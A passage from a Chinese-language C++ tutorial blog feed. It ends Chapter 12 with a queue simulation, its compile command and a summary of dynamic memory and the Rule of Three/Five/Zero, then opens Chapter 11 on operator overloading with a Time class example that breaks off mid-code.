(wait_time &gt; <span class="number">0</span>)</span><br><span class="line">            wait_time--;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 累加当前队列长度</span></span><br><span class="line">        sum_line += line.queuecount();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// --- 模拟循环结束 ---</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 输出模拟结果 ---</span></span><br><span class="line">    <span class="keyword">if</span> (customers &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nCustomers accepted: &quot;</span> &lt;&lt; customers &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Customers served: &quot;</span> &lt;&lt; served &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;         Turnaways: &quot;</span> &lt;&lt; turnaways &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Average queue size: &quot;</span>;</span><br><span class="line">        <span class="built_in">cout</span>.precision(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">cout</span>.setf(ios_base::fixed, ios_base::floatfield);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; (<span class="keyword">double</span>) sum_line / cyclelimit &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 平均队列长度</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Average wait time: &quot;</span></span><br><span class="line">             &lt;&lt; (<span class="keyword">double</span>) line_wait / served &lt;&lt; <span class="string">&quot; minutes\n&quot;</span>; <span class="comment">// 平均等待时间</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No customers!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Done!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义：判断是否有新客户到来</span></span><br><span class="line"><span class="comment">// 这是一个简单的概率模型：在一分钟内，客户到来的概率是 1/x</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">newcustomer</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// rand() * x / RAND_MAX &lt; 1  等价于 rand() / RAND_MAX &lt; 1/x</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">std</span>::rand() * x / RAND_MAX &lt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译和运行:</strong></p><p>你需要将 <code>queue.cpp</code> 和 <code>atm.cpp</code> 一起编译链接。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ atm.cpp queue.cpp -o atm</span><br><span class="line">./atm</span><br></pre></td></tr></table></figure><p>程序会提示你输入队列最大长度、模拟小时数和平均每小时客户数，然后运行模拟并输出结果。你可以尝试不同的输入值，观察它们对平均等待时间和队列长度的影响。这个模拟虽然简单，但它展示了如何使用类（特别是涉及动态内存的类）来解决实际问题。</p><h2 id="12-8-总结"><a href="#12-8-总结" class="headerlink" title="12.8 总结"></a>12.8 总结</h2><p>本章深入探讨了当 C++ 类需要直接管理动态分配的内存（使用 <code>new</code> 和 <code>delete</code>）时所面临的挑战和必需的技术。核心问题在于编译器自动生成的默认成员函数（特别是复制构造函数和赋值运算符）执行的浅复制行为，这对于包含原始指针成员的类来说是危险的。</p><p>主要内容回顾：</p><ol><li><p><strong>动态内存和类的问题:</strong></p><ul><li>  如果类使用 <code>new</code> 分配内存并存储在指针成员中，默认的复制构造函数和赋值运算符只会复制指针的地址（<strong>浅复制</strong>），而不是指针指向的数据。</li><li>  浅复制导致多个对象共享同一块动态内存，当其中一个对象被销毁并调用析构函数 <code>delete</code> 内存时，其他对象的指针就变成了<strong>悬挂指针</strong>。</li><li>  后续对悬挂指针的访问或在其他对象析构时再次 <code>delete</code> 同一块内存（<strong>重复删除</strong>）会导致未定义行为和程序崩溃。</li><li>  默认赋值运算符还可能导致<strong>内存泄漏</strong>，因为它覆盖了旧指针而没有释放其指向的内存。</li></ul></li><li><p><strong>特殊成员函数和复制控制 (Rule of Three/Five):</strong></p><ul><li>为了解决浅复制问题，管理动态内存的类通常需要提供自定义的特殊成员函数：<ul><li>  <strong>析构函数 (<code>~ClassName()</code>):</strong> 必须定义，负责使用 <code>delete</code> 或 <code>delete[]</code> 释放由构造函数分配的所有动态内存。</li><li>  <strong>复制构造函数 (<code>ClassName(const ClassName &amp;)</code>):</strong> 必须定义，执行<strong>深复制</strong>——为新对象分配独立的内存，并将源对象的数据复制到新内存中。</li><li>  <strong>复制赋值运算符 (<code>ClassName &amp; operator=(const ClassName &amp;)</code>):</strong> 必须定义，执行<strong>深复制</strong>，同时需要处理<strong>自我赋值</strong>（<code>obj = obj;</code>）并<strong>释放旧资源</strong>，最后返回 <code>*this</code>。</li></ul></li><li>  <strong>三法则 (Rule of Three, C++11 前):</strong> 如果你需要自定义析构函数、复制构造函数或复制赋值运算符中的任何一个，你几乎肯定需要全部三个。</li><li>  <strong>五法则 (Rule of Five, C++11 及以后):</strong> 随着移动语义的引入，如果需要自定义上述三个或移动构造函数/移动赋值运算符中的任何一个，通常需要考虑所有五个。</li></ul></li><li><p> <strong>改进的 <code>String</code> 类:</strong> 通过实现自定义的析构函数、复制构造函数和赋值运算符（执行深复制），我们创建了一个能够安全管理动态内存的 <code>String</code> 类。</p></li><li><p><strong>构造函数中使用 <code>new</code> 的注意事项:</strong></p><ul><li>  必须在析构函数中配对使用 <code>delete</code> 或 <code>delete[]</code>。</li><li>  <code>new</code> 可能失败并抛出 <code>std::bad_alloc</code> 异常。如果构造函数在 <code>new</code> 失败前已分配其他资源，需要注意资源泄漏问题（析构函数不会被调用）。使用 RAII（如智能指针）是更安全的做法。</li><li>  如果类的成员是其他类的对象，默认的复制/赋值操作会调用成员对象的相应复制/赋值操作。如果成员对象能正确处理自己的资源，这通常是安全的。</li></ul></li><li><p><strong>返回对象:</strong></p><ul><li>  <strong>按引用返回 (<code>&amp;</code> 或 <code>const &amp;</code>):</strong> 高效，用于返回已存在的对象，但不能返回局部变量的引用。</li><li>  <strong>按值返回 (<code>ClassName</code>):</strong> 安全，返回副本或移动后的对象。现代 C++ 通过 RVO/NRVO 和移动语义使其通常足够高效。</li></ul></li><li><p><strong>指向对象的指针:</strong></p><ul><li>  使用 <code>new</code> 动态创建对象，返回对象指针。</li><li>  使用 <code>delete</code> 销毁对象（调用析构函数并释放内存）。</li><li>  使用 <code>new[]</code> 和 <code>delete[]</code> 处理动态对象数组。</li><li>  使用箭头运算符 <code>-&gt;</code> 访问指针指向对象的成员。</li><li>  <strong>定位 <code>new</code> (<code>placement new</code>):</strong> 在预先分配好的内存地址上构造对象，需要显式调用析构函数 (<code>ptr-&gt;~ClassName()</code>) 来销毁对象，内存需另外管理。</li></ul></li><li><p><strong>静态类成员:</strong></p><ul><li>  <strong>静态数据成员:</strong> 被类的所有对象共享，独立于任何对象存在，通常在类外初始化。</li><li>  <strong>静态成员函数:</strong> 不与特定对象关联（无 <code>this</code> 指针），只能访问静态成员，可通过类名调用 (<code>ClassName::static_func()</code>)。</li></ul></li><li><p> <strong>队列模拟:</strong> 演示了如何应用类和动态内存管理（链表实现的队列）来解决一个实际的模拟问题。</p></li><li><p> <strong>现代 C++ 建议 (Rule of Zero):</strong> 尽可能使用标准库提供的资源管理类（如 <code>std::string</code>, <code>std::vector</code>, <code>std::unique_ptr</code>, <code>std::shared_ptr</code>），它们遵循 RAII 原则并正确实现了复制/移动语义。如果你的类只使用这些工具来管理资源，通常就不需要编写任何自定义的特殊成员函数（零法则），从而使代码更简单、更安全。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 11 使用类</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_11/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_11/</url>
      
        <content type="html"><![CDATA[<h2 id="11-1-运算符重载"><a href="#11-1-运算符重载" class="headerlink" title="11.1 运算符重载"></a>11.1 运算符重载</h2><p>C++ 允许将运算符（如 <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>==</code> 等）应用于<strong>类对象</strong>，就像它们是内置类型（如 <code>int</code> 或 <code>double</code>）一样。这种特性称为**运算符重载 (Operator Overloading)**。</p><p><strong>目的:</strong></p><p>运算符重载的主要目的是<strong>提高代码的可读性和直观性</strong>。通过重载运算符，我们可以让我们自己定义的类（比如表示复数、向量、时间或字符串的类）能够使用熟悉的运算符进行操作，使得代码更接近自然语言或数学表示法。</p><p>例如，假设你有一个表示二维向量的类 <code>Vector</code>。如果没有运算符重载，你可能需要这样写代码来计算两个向量的和：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Vector <span class="title">v1</span><span class="params">(<span class="number">1.0</span>, <span class="number">2.0</span>)</span></span>;</span><br><span class="line"><span class="function">Vector <span class="title">v2</span><span class="params">(<span class="number">3.0</span>, <span class="number">4.0</span>)</span></span>;</span><br><span class="line">Vector sum = v1.add(v2); <span class="comment">// 使用名为 add 的成员函数</span></span><br></pre></td></tr></table></figure><p>通过重载 <code>+</code> 运算符，你可以写出更自然、更简洁的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Vector <span class="title">v1</span><span class="params">(<span class="number">1.0</span>, <span class="number">2.0</span>)</span></span>;</span><br><span class="line"><span class="function">Vector <span class="title">v2</span><span class="params">(<span class="number">3.0</span>, <span class="number">4.0</span>)</span></span>;</span><br><span class="line">Vector sum = v1 + v2; <span class="comment">// 使用重载的 + 运算符</span></span><br></pre></td></tr></table></figure><p><strong>如何实现:</strong></p><p>运算符重载是通过编写特殊的<strong>运算符函数 (Operator Functions)</strong> 来实现的。运算符函数的名称格式为 <code>operator</code> 关键字后跟要重载的运算符符号。例如，重载加法运算符 <code>+</code> 的函数名为 <code>operator+</code>，重载小于运算符 <code>&lt;</code> 的函数名为 <code>operator&lt;</code>。</p><p>运算符函数可以被定义为：</p><ol><li><p><strong>类的成员函数 (Member Function):</strong></p><ul><li>  当运算符函数是成员函数时，它的<strong>第一个操作数</strong>隐式地是调用该函数的对象（通过 <code>this</code> 指针访问）。</li><li>  对于二元运算符（如 <code>+</code>, <code>-</code>, <code>*</code>），成员函数只需要<strong>一个显式参数</strong>（代表右操作数）。</li><li>  对于一元运算符（如 <code>-</code> (负号), <code>++</code> (前缀)），成员函数<strong>没有显式参数</strong>。</li></ul></li><li><p><strong>非成员函数 (Non-member Function):</strong></p><ul><li>  通常将非成员运算符函数声明为类的**友元 (friend)**，以便它可以访问类的私有成员。</li><li>  对于二元运算符，非成员函数需要<strong>两个显式参数</strong>（分别代表左操作数和右操作数）。</li><li>  对于一元运算符，非成员函数需要<strong>一个显式参数</strong>。</li></ul></li></ol><p><strong>基本语法 (以二元运算符 <code>+</code> 为例):</strong></p><p><strong>作为成员函数:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... 其他成员 ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明重载的 + 运算符 (成员函数)</span></span><br><span class="line">    <span class="comment">// other 是右操作数对象</span></span><br><span class="line">    MyClass <span class="keyword">operator</span>+(<span class="keyword">const</span> MyClass&amp; other) <span class="keyword">const</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义</span></span><br><span class="line">MyClass MyClass::<span class="keyword">operator</span>+(<span class="keyword">const</span> MyClass&amp; other) <span class="keyword">const</span> &#123;</span><br><span class="line">    MyClass result;</span><br><span class="line">    <span class="comment">// 实现加法逻辑，通常涉及 this 对象和 other 对象</span></span><br><span class="line">    <span class="comment">// result.data = this-&gt;data + other.data; // 假设有 data 成员</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line">MyClass obj1, obj2;</span><br><span class="line">MyClass sum = obj1 + obj2; <span class="comment">// 实际调用 obj1.operator+(obj2)</span></span><br></pre></td></tr></table></figure><p><strong>作为非成员函数 (通常是友元):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... 私有成员 ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... 其他公有成员 ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明友元函数来重载 + 运算符</span></span><br><span class="line">    <span class="keyword">friend</span> MyClass <span class="keyword">operator</span>+(<span class="keyword">const</span> MyClass&amp; left, <span class="keyword">const</span> MyClass&amp; right);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 (非成员函数，不需要 MyClass::)</span></span><br><span class="line">MyClass <span class="keyword">operator</span>+(<span class="keyword">const</span> MyClass&amp; left, <span class="keyword">const</span> MyClass&amp; right) &#123;</span><br><span class="line">    MyClass result;</span><br><span class="line">    <span class="comment">// 实现加法逻辑，访问 left 和 right 对象的成员 (需要友元权限访问私有成员)</span></span><br><span class="line">    <span class="comment">// result.data = left.data + right.data; // 假设有 data 成员</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line">MyClass obj1, obj2;</span><br><span class="line">MyClass sum = obj1 + obj2; <span class="comment">// 实际调用 operator+(obj1, obj2)</span></span><br></pre></td></tr></table></figure><p><strong>注意事项:</strong></p><ul><li>  <strong>不能创建新的运算符:</strong> 你只能重载 C++ 中已有的运算符，不能发明新的运算符（比如 <code>**</code> 或 <code>##</code>）。</li><li>  <strong>不能改变运算符的优先级或结合性:</strong> 重载 <code>+</code> 和 <code>*</code> 后，<code>*</code> 的优先级仍然高于 <code>+</code>。</li><li>  <strong>不能改变运算符的操作数个数:</strong> 不能将二元运算符重载为一元运算符，反之亦然。</li><li>  <strong>至少一个操作数是用户定义类型:</strong> 不能为两个内置类型（如 <code>int</code> 和 <code>int</code>）重载运算符。运算符重载必须涉及至少一个类对象（或枚举类型）。</li><li><strong>某些运算符不能重载:</strong><ul><li>  <code>.</code> (成员访问运算符)</li><li>  <code>.*</code> (成员指针访问运算符)</li><li>  <code>::</code> (作用域解析运算符)</li><li>  <code>sizeof</code> (大小运算符)</li><li>  <code>?:</code> (条件运算符)</li><li>  <code>typeid</code> (运行时类型识别运算符)</li><li>  <code>static_cast</code>, <code>dynamic_cast</code>, <code>const_cast</code>, <code>reinterpret_cast</code> (类型转换运算符，虽然 <code>operator type()</code> 形式的转换函数可以定义)</li></ul></li></ul><p>运算符重载是 C++ 提供的一个强大工具，可以使自定义类的使用更加自然和方便。然而，也应谨慎使用，避免过度或不直观的重载，以免降低代码的可读性。接下来的章节将通过具体的例子来演示如何重载不同的运算符。</p><h2 id="11-2-计算时间：一个运算符重载示例"><a href="#11-2-计算时间：一个运算符重载示例" class="headerlink" title="11.2 计算时间：一个运算符重载示例"></a>11.2 计算时间：一个运算符重载示例</h2><p>为了具体说明运算符重载的过程和用法，让我们创建一个简单的 <code>Time</code> 类来表示时间（小时和分钟），并为其重载一些运算符。</p><p><strong>基础 <code>Time</code> 类:</strong></p><p>首先，我们定义一个基础的 <code>Time</code> 类，包含小时和分钟，一个构造函数来初始化时间，以及一个 <code>show()</code> 方法来显示时间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// time.h -- Time 类定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TIME_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIME_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> hours;</span><br><span class="line">    <span class="keyword">int</span> minutes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数，默认值为 0 时 0 分</span></span><br><span class="line">    Time(<span class="keyword">int</span> h = <span class="number">0</span>, <span class="keyword">int</span> m = <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 添加分钟数的方法 (内部会处理进位)</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AddMin</span><span class="params">(<span class="keyword">int</span> m)</span></span>;</span><br><span class="line">    <span class="comment">// 添加小时数的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AddHr</span><span class="params">(<span class="keyword">int</span> h)</span></span>;</span><br><span class="line">    <span class="comment">// 重置时间为 0 时 0 分</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Reset</span><span class="params">(<span class="keyword">int</span> h = <span class="number">0</span>, <span class="keyword">int</span> m = <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="comment">// 显示时间</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// TIME_H_</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// time.cpp -- Time 类方法实现</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;time.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">Time::Time(<span class="keyword">int</span> h, <span class="keyword">int</span> m) &#123;</span><br><span class="line">    hours = h;</span><br><span class="line">    minutes = m;</span><br><span class="line">    <span class="comment">// 可以添加一些验证逻辑，例如确保分钟数小于60</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Time::AddMin</span><span class="params">(<span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">    minutes += m;</span><br><span class="line">    hours += minutes / <span class="number">60</span>; <span class="comment">// 整数除法，计算增加的小时数</span></span><br><span class="line">    minutes %= <span class="number">60</span>;       <span class="comment">// 取模，得到剩余的分钟数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Time::AddHr</span><span class="params">(<span class="keyword">int</span> h)</span> </span>&#123;</span><br><span class="line">    hours += h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Time::Reset</span><span class="params">(<span class="keyword">int</span> h, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">    hours = h;</span><br><span class="line">    minutes = m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Time::Show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; hours &lt;&lt; <span class="string">&quot; hours, &quot;</span> &lt;&lt; minutes &lt;&lt; <span class="string">&quot; minutes&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个基础类允许我们创建 <code>Time</code> 对象并对其进行一些基本操作，但还不能直接使用 <code>+</code> 等运算符。</p><h3 id="11-2-1-添加加法运算符"><a href="#11-2-1-添加加法运算符" class="headerlink" title="11.2.1 添加加法运算符"></a>11.2.1 添加加法运算符</h3><p>我们希望能够像 <code>total = time1 + time2;</code> 这样将两个 <code>Time</code> 对象相加。为此，我们需要重载 <code>+</code> 运算符。我们将它实现为 <code>Time</code> 类的<strong>成员函数</strong>。</p><p><strong>在 <code>time.h</code> 中添加声明:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.h</span></span><br><span class="line"><span class="comment">// ... (包含 guards 和 iostream) ...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> hours;</span><br><span class="line">    <span class="keyword">int</span> minutes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Time(<span class="keyword">int</span> h = <span class="number">0</span>, <span class="keyword">int</span> m = <span class="number">0</span>);</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AddMin</span><span class="params">(<span class="keyword">int</span> m)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AddHr</span><span class="params">(<span class="keyword">int</span> h)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Reset</span><span class="params">(<span class="keyword">int</span> h = <span class="number">0</span>, <span class="keyword">int</span> m = <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重载加法运算符 (+) 作为成员函数</span></span><br><span class="line">    <span class="comment">// 参数 t 代表加号右边的 Time 对象</span></span><br><span class="line">    <span class="comment">// const 关键字表示这个函数不会修改调用它的对象 (加号左边的对象)</span></span><br><span class="line">    <span class="comment">// 返回一个新的 Time 对象作为结果</span></span><br><span class="line">    Time <span class="keyword">operator</span>+(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... (endif) ...</span></span><br></pre></td></tr></table></figure><p><strong>在 <code>time.cpp</code> 中添加定义:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;time.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... (构造函数和其他方法的定义) ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义重载的加法运算符</span></span><br><span class="line">Time Time::<span class="keyword">operator</span>+(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span> &#123;</span><br><span class="line">    Time sum; <span class="comment">// 创建一个临时的 Time 对象来存储结果</span></span><br><span class="line">    sum.minutes = minutes + t.minutes; <span class="comment">// 将两个对象的分钟数相加</span></span><br><span class="line">    sum.hours = hours + t.hours + sum.minutes / <span class="number">60</span>; <span class="comment">// 将小时数相加，并加上分钟进位的小时</span></span><br><span class="line">    sum.minutes %= <span class="number">60</span>; <span class="comment">// 调整结果的分钟数</span></span><br><span class="line">    <span class="keyword">return</span> sum; <span class="comment">// 返回结果对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用重载的 <code>+</code> 运算符:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp -- 使用 Time 类和重载的 +</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;time.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Time <span class="title">planning</span><span class="params">(<span class="number">2</span>, <span class="number">40</span>)</span></span>; <span class="comment">// 2 小时 40 分钟</span></span><br><span class="line">    <span class="function">Time <span class="title">coding</span><span class="params">(<span class="number">5</span>, <span class="number">55</span>)</span></span>;   <span class="comment">// 5 小时 55 分钟</span></span><br><span class="line">    <span class="function">Time <span class="title">fixing</span><span class="params">(<span class="number">1</span>, <span class="number">30</span>)</span></span>;   <span class="comment">// 1 小时 30 分钟</span></span><br><span class="line">    Time total;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Planning time = &quot;</span>;</span><br><span class="line">    planning.Show();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Coding time = &quot;</span>;</span><br><span class="line">    coding.Show();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用重载的 + 运算符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Calculating total time...\n&quot;</span>;</span><br><span class="line">    total = planning + coding + fixing; <span class="comment">// 相当于 (planning.operator+(coding)).operator+(fixing)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 